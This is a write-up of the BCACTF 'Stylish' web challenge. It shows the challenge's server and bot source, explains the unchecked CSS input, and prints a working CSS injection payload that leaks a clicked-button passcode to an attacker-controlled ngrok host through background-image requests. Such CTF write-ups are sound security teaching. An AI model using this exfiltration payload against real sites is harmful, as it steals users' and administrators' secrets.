+++
title = "BCACTF Stylish"
date = "2021-06-14T01:46:05+02:00"
author = "Filip Poplewski"
tags = ["CTF", "Web", "English"]
cover = "https://ctftime.org/media/events/LogoArtboard_1.png"
description = """


What can happen if we give users ability to change the color on the website.   
Oh... hack into administrator account, how is this even possible???   
"""

showFullContent = false
readingTime = false
hideComments = false
color = "green" #color from the theme settings
+++



# Stylish

## Challenge description 
![img](/BCACTF/Pasted_image_20210614000841.png)</br>
Stylish is the one of the hardest challenges at the website and it give us 400 points.
Organizers give us URL to website and server source code files.  


## Look at the website 
![img](/BCACTF/Pasted_image_20210613000440.png)</br>
![img](/BCACTF/Pasted_image_20210613000518.png)</br>
Ok so as we can see at website we have got 4 color inputs serialized with JSON and send by GET parameter. By clicking "Submit for review" button we can  send them to admin.    
But second important thing in our website is "Get flag" button.

![img](/BCACTF/Pasted_image_20210613000448.png)</br>
Our goal in this CTF is steal admin secret code to the flag.

## Look at the source code 
#### passcode.js
```js
export default function generatePasscode() {
	const chars = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F"];
	for (let i = 0; i < chars.length - 1; i++) {
		let temp = chars[i];
		let j = Math.floor(Math.random() * (chars.length - i)) + i;
		chars[i] = chars[j];
		chars[j] = temp;
	}
	return chars.join("");
}
```
Password is generated from 16 hexadecimal character in random order. 

#### server.js
```js
app.post("/submit", async (req, res) => {

 try {
	 const {bg, fg, bbg, bfg} = req.body;
	 if (typeof bg !== "string") return res.status(400).type("txt").send("bg must be a string");
	 if (typeof fg !== "string") return res.status(400).type("txt").send("fg must be a string");
	 if (typeof bbg !== "string") return res.status(400).type("txt").send("bbg must be a string");
	 if (typeof bfg !== "string") return res.status(400).type("txt").send("bfg must be a string");
	 const encoded = encodeURIComponent(JSON.stringify({ bg, fg, bbg, bfg }));
	 if (encoded.length > 2000) return res.status(400).type("txt").send("Theme permalink too long (>2000 chars)");

  

	 await visit('http://localhost:1337/#${encoded}', passcode);
	 res.type("txt");
	 res.send("The admin has checked out your theme!");
 } catch (e) {
	 console.error(e.stack);
	 res.sendStatus(500);
 }
});
```
#### visit.js
```js
 await page.goto(url, {waitUntil: "load", timeout: 1000});
 await page.click("#get-flag");
 await page.waitForSelector(".e");

 for (let i \= 0; i < passcode.length; i++) {
	const char \= passcode.charAt(i);
	const id \= "button" + Math.floor(Math.random() \* 123456);
	await page.evaluate(\`
		document.querySelectorAll(".e > button").forEach(button => {
			if (button.innerText === "${char}") {
				button.id = "${id}";
			}
		})
	`);
	await page.click(\`#${id}\`);
	await timeout(50);
 }
 await page.click(".s");
 await timeout(1000);
 ```
By looking at the source code we can see that CSS sent by user isn't verified at all (except checking if it is string but it's not problem at all) so we can easily inject own CSS style.
After setting our CSS style admin sets id (always beginning at "button") to button which creates randomly generated passcode and click them.   


### Attack scenario
1. Send to admin CSS which will try to load background from website hosted on our PC. According on which button have been clicked it will be try to download file with button number. For example if clicked button will be "F" it will try to load img from www.my_website.com/F, if clicked button will be "4" it will try to download www.my_website.com/4.
2. Listen on server img requests.
3. Login for flag with obtained numbers.

### CSS payload
```css
red;}
button:nth-child(1)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/0")}
button:nth-child(2)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/1")}
button:nth-child(3)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/2")}
button:nth-child(4)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/3")}
button:nth-child(5)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/4")}
button:nth-child(6)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/5")}
button:nth-child(7)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/6")}
button:nth-child(8)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/7")}
button:nth-child(9)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/8")}
button:nth-child(10)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/9")}
button:nth-child(11)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/A")}
button:nth-child(12)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/B")}
button:nth-child(13)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/C")}
button:nth-child(14)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/D")}
button:nth-child(15)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/E")}
button:nth-child(16)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/F")}
```





### payload sent
![img](/BCACTF/Pasted_image_20210612234737.png)</br>
Unfortunately my exploit doesn't catch one number (zero) so I had to brute force his position :(

![img](/BCACTF/Pasted_image_20210613000604.png)</br>
After few minute we got the flag.
